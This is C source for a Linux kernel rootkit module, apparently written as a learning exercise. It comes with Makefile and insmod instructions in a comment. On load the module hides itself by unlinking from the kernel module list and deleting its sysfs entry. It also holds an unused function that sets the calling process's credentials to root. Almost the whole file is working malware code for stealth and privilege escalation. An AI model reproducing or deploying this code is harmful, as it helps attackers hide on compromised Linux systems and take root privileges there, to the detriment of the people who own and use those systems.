/*
Just learning some tings

Makefile: 
-----------
obj-m += r00tk1t.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
------------
then: $ insmod rootkit.ko
and we good to g0g0!
*/

#include <linux/module.h>   
#include <linux/kernel.h>   
#include <linux/init.h> 
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ka^Io");

int c0v3rtr4x(void)
{
    list_del_init(&__this_module.list); // for proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);   // for sys/module
    return 0;
}

int el3v4t3(void)
{
    struct task_struct *t4sk;
    struct cred *cr3d;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);


    t4sk = get_current();
    if (t4sk == NULL) {
      printk("Failed to get current task info.\n");
      return -1;
    }

    cr3d = prepare_creds();
    if (cr3d == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }

    cr3d->uid = kuid;
    cr3d->gid = kgid;
    cr3d->euid = kuid;
    cr3d->egid = kgid;

    commit_creds(cr3d);
    return 0;    
}

static int __init g0g0(void)
{
   c0v3rtr4x();
   return 0;
}

static void __exit farewell(void)
{
    printk(KERN_INFO "goodbye\n");
    return;
}

module_init(g0g0);
module_exit(farewell);
